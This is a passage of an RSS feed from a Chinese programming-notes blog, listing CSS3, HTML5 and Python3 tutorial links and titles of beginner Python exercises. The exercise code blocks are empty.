<li><a href="/languages/css3/tutorial/boxmodel.html" target="blank">框模型</a></li>
<li><a href="/languages/css3/tutorial/outline.html" target="blank">轮廓</a></li>
<li><a href="/languages/css3/tutorial/text.html" target="blank">文本</a></li>
<li><a href="/languages/css3/tutorial/font.html" target="blank">字体</a></li>
<li><a href="/languages/css3/tutorial/icons.html" target="blank">图标</a></li>
<li><a href="/languages/css3/tutorial/link.html" target="blank">链接</a></li>
<li><a href="/languages/css3/tutorial/list.html" target="blank">列表</a></li>
<li><a href="/languages/css3/tutorial/table.html" target="blank">表格</a></li>
<li><a href="/languages/css3/tutorial/display_visibility.html" target="blank">Display</a></li>
<li><a href="/languages/css3/tutorial/max_width.html" target="blank">max_width</a></li>
<li><a href="/languages/css3/tutorial/positioning.html" target="blank">定位</a></li>
<li><a href="/languages/css3/tutorial/overflow.html" target="blank">溢出</a></li>
<li><a href="/languages/css3/tutorial/float.html" target="blank">浮动和清除</a></li>
<li><a href="/languages/css3/tutorial/inline_block.html" target="blank">inline_block</a></li>
<li><a href="/languages/css3/tutorial/align.html" target="blank">对齐</a></li>
<li><a href="/languages/css3/tutorial/combinators.html" target="blank">组合器</a></li>
<li><a href="/languages/css3/tutorial/pseudo_classes.html" target="blank">伪类</a></li>
<li><a href="/languages/css3/tutorial/pseudo_elements.html" target="blank">伪元素</a></li>
<li><a href="/languages/css3/tutorial/transparency.html" target="blank">透明度</a></li>
<li><a href="/languages/css3/tutorial/navbar.html" target="blank">导航栏</a></li>
<li><a href="/languages/css3/tutorial/dropdowns.html" target="blank">下拉菜单</a></li>
<li><a href="/languages/css3/tutorial/images.html" target="blank">图片库</a></li>
<li><a href="/languages/css3/tutorial/attribute_selectors.html" target="blank">属性选择器</a></li>
</ul>
<h3> 参考手册</h3>
<ul>
<li><a href="/languages/css3/references/attributes.html" target="blank">属性</a></li>
<li><a href="/languages/css3/references/selectors.html" target="blank">选择器</a></li>
<li><a href="/languages/css3/references/pseudo_classes.html" target="blank">伪类</a></li>
<li><a href="/languages/css3/references/pseudo_elements.html" target="blank">伪元素</a></li>
<li><a href="/languages/css3/references/functions.html" target="blank">函数</a></li>
<li><a href="/languages/css3/references/animatable.html" target="blank">动画属性</a></li>
<li><a href="/languages/css3/references/websafe_fonts.html" target="blank">网络安全字体</a></li>
<li><a href="/languages/css3/references/units.html" target="blank">单位</a></li>
<li><a href="/languages/css3/references/colors.html" target="blank">颜色</a></li>
<li><a href="/languages/css3/references/default_values.html" target="blank">默认值</a></li>
<li><a href="/languages/css3/references/entities.html" target="blank">实体</a></li>
<li><a href="/languages/css3/references/aural.html" target="blank">听觉</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>HTML5</title>
      <link>https://sankgao.github.io/languages/html5/</link>
      <guid>https://sankgao.github.io/languages/html5/</guid>
      <source url="https://sankgao.github.io/rss.xml">HTML5</source>
      <description>记录一些 HTML5 相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 HTML5 相关的信息。</p>
<!-- more -->
<h2> HTML5</h2>
<h3> 基础教程</h3>
<ul>
<li><a href="/languages/html5/tutorial/introduction.html" target="blank">简介</a></li>
<li><a href="/languages/html5/tutorial/base.html" target="blank">基础</a></li>
<li><a href="/languages/html5/tutorial/elements.html" target="blank">元素</a></li>
<li><a href="/languages/html5/tutorial/attributes.html" target="blank">属性</a></li>
<li><a href="/languages/html5/tutorial/title.html" target="blank">标题</a></li>
<li><a href="/languages/html5/tutorial/paragraph.html" target="blank">段落</a></li>
<li><a href="/languages/html5/tutorial/style.html" target="blank">样式</a></li>
<li><a href="/languages/html5/tutorial/formatting.html" target="blank">格式化</a></li>
<li><a href="/languages/html5/tutorial/comments.html" target="blank">注释</a></li>
<li><a href="/languages/html5/tutorial/colors.html" target="blank">颜色</a></li>
<li><a href="/languages/html5/tutorial/css.html" target="blank">CSS</a></li>
<li><a href="/languages/html5/tutorial/links.html" target="blank">链接</a></li>
<li><a href="/languages/html5/tutorial/images.html" target="blank">图像</a></li>
<li><a href="/languages/html5/tutorial/tables.html" target="blank">表格</a></li>
<li><a href="/languages/html5/tutorial/lists.html" target="blank">列表</a></li>
<li><a href="/languages/html5/tutorial/blocks.html" target="blank">块</a></li>
<li><a href="/languages/html5/tutorial/classes.html" target="blank">类</a></li>
<li><a href="/languages/html5/tutorial/id.html" target="blank">Id 属性</a></li>
<li><a href="/languages/html5/tutorial/iframe.html" target="blank">内联框架</a></li>
<li><a href="/languages/html5/tutorial/javascript.html" target="blank">JavScript</a></li>
<li><a href="/languages/html5/tutorial/filepaths.html" target="blank">文件路径</a></li>
<li><a href="/languages/html5/tutorial/head.html" target="blank">头部</a></li>
<li><a href="/languages/html5/tutorial/layout.html" target="blank">布局</a></li>
<li><a href="/languages/html5/tutorial/responsive.html" target="blank">响应式</a></li>
<li><a href="/languages/html5/tutorial/computercode.html" target="blank">计算机代码</a></li>
<li><a href="/languages/html5/tutorial/semantic.html" target="blank">语义</a></li>
<li><a href="/languages/html5/tutorial/entities.html" target="blank">实体</a></li>
<li><a href="/languages/html5/tutorial/emoji.html" target="blank">表情符号</a></li>
<li><a href="/languages/html5/tutorial/charset.html" target="blank">字符集</a></li>
<li><a href="/languages/html5/tutorial/url.html" target="blank">URL</a></li>
<li><a href="/languages/html5/tutorial/frames.html" target="blank">框架</a></li>
<li><a href="/languages/html5/tutorial/backgrounds.html" target="blank">背景</a></li>
<li><a href="/languages/html5/tutorial/forms.html" target="blank">表单</a></li>
<li><a href="/languages/html5/tutorial/form_attributes.html" target="blank">表单属性</a></li>
<li><a href="/languages/html5/tutorial/form_elements.html" target="blank">表单元素</a></li>
<li><a href="/languages/html5/tutorial/form_input_types.html" target="blank">输入类型</a></li>
<li><a href="/languages/html5/tutorial/form_input_attributes.html" target="blank">输入属性</a></li>
<li><a href="/languages/html5/tutorial/form_attributes_form.html" target="blank">Input 表单属性</a></li>
<li><a href="/languages/html5/tutorial/canvas.html" target="blank">Canvas</a></li>
<li><a href="/languages/html5/tutorial/svg.html" target="blank">SVG</a></li>
<li><a href="/languages/html5/tutorial/canvas_vs_svg.html" target="blank">Canvas 对比 SVG</a></li>
<li><a href="/languages/html5/tutorial/media.html" target="blank">多媒体</a></li>
<li><a href="/languages/html5/tutorial/object.html" target="blank">对象</a></li>
<li><a href="/languages/html5/tutorial/audio.html" target="blank">音频</a></li>
<li><a href="/languages/html5/tutorial/video.html" target="blank">视频</a></li>
<li><a href="/languages/html5/tutorial/youtube.html" target="blank">YouTube</a></li>
<li><a href="/languages/html5/tutorial/geolocation.html" target="blank">地理定位</a></li>
<li><a href="/languages/html5/tutorial/draganddrop.html" target="blank">拖放</a></li>
<li><a href="/languages/html5/tutorial/localstorage.html" target="blank">本地存储</a></li>
<li><a href="/languages/html5/tutorial/app_cache.html" target="blank">应用程序缓存</a></li>
<li><a href="/languages/html5/tutorial/webworkers.html" target="blank">Web Workers</a></li>
<li><a href="/languages/html5/tutorial/serversentevents.html" target="blank">Server-Sent 事件</a></li>
</ul>
<h3> 参考手册</h3>
<ul>
<li><a href="/languages/html5/references/tags.html" target="blank">标签元素</a></li>
<li><a href="/languages/html5/references/global_attribute.html" target="blank">全局属性</a></li>
<li><a href="/languages/html5/references/global_event.html" target="blank">全局事件</a></li>
<li><a href="/languages/html5/references/colornames.html" target="blank">颜色名称</a></li>
<li><a href="/languages/html5/references/canvas.html" target="blank">Canvas 画布</a></li>
<li><a href="/languages/html5/references/audio_video.html" target="blank">音频/视频</a></li>
<li><a href="/languages/html5/references/charactersets.html" target="blank">字符集</a></li>
<li><a href="/languages/html5/references/urlencode.html" target="blank">URL 编码</a></li>
<li><a href="/languages/html5/references/language_codes.html" target="blank">语言代码</a></li>
<li><a href="/languages/html5/references/country_codes.html" target="blank">国家/地区代码</a></li>
<li><a href="/languages/html5/references/status_messages.html" target="blank">状态消息</a></li>
<li><a href="/languages/html5/references/methods.html" target="blank">请求方法</a></li>
<li><a href="/languages/html5/references/shortcuts.html" target="blank">键盘快捷键</a></li>
</ul>
<h3> 标签</h3>
<ul>
<li><a href="/languages/html5/tags/comment.html" target="blank">&lt;!--...--&gt;</a></li>
<li><a href="/languages/html5/tags/doctype.html" target="blank">&lt;!DOCTYPE&gt;</a></li>
<li><a href="/languages/html5/tags/a.html" target="blank">&lt;a&gt;</a></li>
<li><a href="/languages/html5/tags/abbr.html" target="blank">&lt;abbr&gt;</a></li>
<li><a href="/languages/html5/tags/acronym.html" target="blank">&lt;acronym&gt;</a></li>
<li><a href="/languages/html5/tags/address.html" target="blank">&lt;address&gt;</a></li>
<li><a href="/languages/html5/tags/applet.html" target="blank">&lt;applet&gt;</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Python3</title>
      <link>https://sankgao.github.io/languages/python3/</link>
      <guid>https://sankgao.github.io/languages/python3/</guid>
      <source url="https://sankgao.github.io/rss.xml">Python3</source>
      <description>记录一些 Python3 相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 Python3 相关的信息。</p>
<!-- more -->
<h2> Python3</h2>
<h3> 基础教程</h3>
<ul>
<li><a href="/languages/python3/tutorial/introduction.html" target="blank">简介</a></li>
<li><a href="/languages/python3/tutorial/base.html" target="blank">基础</a></li>
<li><a href="/languages/python3/tutorial/comments.html" target="blank">注释</a></li>
<li><a href="/languages/python3/tutorial/variables.html" target="blank">变量</a></li>
<li><a href="/languages/python3/tutorial/datatypes.html" target="blank">数据类型</a></li>
<li><a href="/languages/python3/tutorial/operators.html" target="blank">运算符</a></li>
<li><a href="/languages/python3/tutorial/flows_control.html" target="blank">流程控制语句</a></li>
<li><a href="/languages/python3/tutorial/jumps.html" target="blank">跳转语句</a></li>
<li><a href="/languages/python3/tutorial/containers.html" target="blank">容器类型的数据</a></li>
<li><a href="/languages/python3/tutorial/strings.html" target="blank">字符串</a></li>
<li><a href="/languages/python3/tutorial/regexp.html" target="blank">正则表达式</a></li>
<li><a href="/languages/python3/tutorial/functions.html" target="blank">函数</a></li>
<li><a href="/languages/python3/tutorial/object_oriented.html" target="blank">面向对象程序设计</a></li>
<li><a href="/languages/python3/tutorial/modules.html" target="blank">模块</a></li>
<li><a href="/languages/python3/tutorial/exception_debug.html" target="blank">异常及调试</a></li>
<li><a href="/languages/python3/tutorial/file_directory.html" target="blank">文件及目录</a></li>
<li><a href="/languages/python3/tutorial/process_thread.html" target="blank">进程和线程</a></li>
<li><a href="/languages/python3/tutorial/databases.html" target="blank">操作数据库</a></li>
<li><a href="/languages/python3/tutorial/responsive.html" target="blank">GUI</a></li>
<li><a href="/languages/python3/tutorial/game.html" target="blank">Pygame 游戏编程</a></li>
<li><a href="/languages/python3/tutorial/web_crawler.html" target="blank">网络爬虫开发</a></li>
</ul>
<h3> 算法和数据结构</h3>
<ul>
<li><a href="/languages/python3/algorithm_data_structure/algorithm_data_structure.html" target="blank">算法和数据结构</a></li>
<li><a href="/languages/python3/algorithm_data_structure/data_structure_base.html" target="blank">数据结构基础</a></li>
<li><a href="/languages/python3/algorithm_data_structure/trees.html" target="blank">树</a></li>
<li><a href="/languages/python3/algorithm_data_structure/sorting.html" target="blank">排序算法</a></li>
<li><a href="/languages/python3/algorithm_data_structure/algorithms_in_interviews.html" target="blank">面试中的算法</a></li>
<li><a href="/languages/python3/algorithm_data_structure/practical_application.html" target="blank">算法的实际应用</a></li>
</ul>
<h3> 参考手册</h3>
<ul>
<li><a href="/languages/python3/references/functions.html" target="blank">函数</a></li>
<li><a href="/languages/python3/references/methods.html" target="blank">方法</a></li>
<li><a href="/languages/python3/references/modules.html" target="blank">模块使用</a></li>
</ul>
<h3> 案例</h3>
<ul>
<li><a href="/languages/python3/cases.html" target="blank">案例</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>案例</title>
      <link>https://sankgao.github.io/languages/python3/cases.html</link>
      <guid>https://sankgao.github.io/languages/python3/cases.html</guid>
      <source url="https://sankgao.github.io/rss.xml">案例</source>
      <description>一些关于 Python 的案例。 计算 BMI 指数 根据身高、体重，计算 BMI 指数。 ::: details 代码 ```python print(&amp;quot;请输入数字：&amp;quot;) height = float(input(&amp;quot;请输入您的身高（米）： &amp;quot;)) weight = float(input(&amp;quot;请输入您的体重（公斤）： &amp;quot;)) print(&amp;quot;您的身高为：...</description>
      <category>Languages</category>
      <pubDate>Wed, 07 Jun 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>一些关于 Python 的案例。</p>
<h2> 计算 BMI 指数</h2>
<p>根据身高、体重，计算 BMI 指数。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 抹零结账</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 查找指定值</h2>
<p>找出 100 以内，可以除以三余二、除以五余三、除以七余二的数。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 九九乘法表</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 统计次数</h2>
<p>从 1 到 99 中尾数是 7 或 7 的倍数，一共出现的次数。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 计算出水仙花数</h2>
<p>水仙花数是一个三位数，三位数各位的立方之和等于三位数本身。水仙花数有 4 个：153、370、371、407</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 查询能量</h2>
<p>模拟支付宝蚂蚁森林的能量产生过程</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 猜数字</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 跳一跳</h2>
<p>输入不同的加分块，并显示分数。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟 10086 查询功能</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 使用二维列表输出不同版式的古诗</h2>
<p>如：柳宗元的《江雪》。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 输出王者荣耀的游戏角色</h2>
<p>王者荣耀游戏中有很多英雄，这些英雄可以分为法师、战士、坦克、刺客、射手和辅助。</p>
<p>本实例将应用 Python 中的列表存储不同类别的英雄，并且遍历输出这些英雄。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟火车订票系统</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 电视剧的收视率排行榜</h2>
<p>应用列表和元组将以下电视剧按收视率由高到低进行排序：</p>
<ul>
<li>《Give up,hold on to me》 收视率：1.4%</li>
<li>《The private dishes of the husbands》 收视率：1.343%</li>
<li>《My father-in-law will do martiaiarts》 收视率：0.92%</li>
<li>《North Canton still believe in love》 收视率：0.862%</li>
<li>《Impossible task》 收视率：0.553%</li>
<li>《Sparrow》 收视率：0.411%</li>
<li>《East of dream Avenue》 收视率：0.164%</li>
<li>《The prodigal son of the new fromtier town》 收视率：0.259%</li>
<li>《Distant distance》 收视率：0.394%</li>
<li>《Music legend》 收视率：0.562%</li>
</ul>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 定制自己的手机套餐</h2>
<p>根据需求定制自己的手机套餐，可选项为话费、流量和短信。</p>
<ul>
<li>话费：0 分钟, 50 分钟, 100 分钟, 300 分钟, 不限量</li>
<li>流量：0M, 500M, 1G, 5G, 不限量</li>
<li>短信：0 条, 50 条, 100 条</li>
</ul>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 判断会员是否可以注册，会员名称不管大小写</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 验证输入的手机号码是否为中国移动的号码</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 验证是否出现危险字符</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 输出象棋口诀并加上正确的标点符合输出</h2>
<p>马走日，
象走田，
车走直路炮翻山，
士走斜线护将边，
小卒一去不回返。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 判断车牌归属地</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟微信抢红包</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 显示实时天气预报</h2>
<p>用 <code>format()</code> 方法格式化输出实时天气预报。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 输出励志每日一贴</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟结账功能——计算实付金额</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> lambda 实现对爬取到的秒杀商品信息进行排序</h2>
<p>排序规则是：优先按秒杀金额升序排列，有重复的，再按折扣比例降序排列。</p>
<details class="hint-container details"><summary>代码</summary>
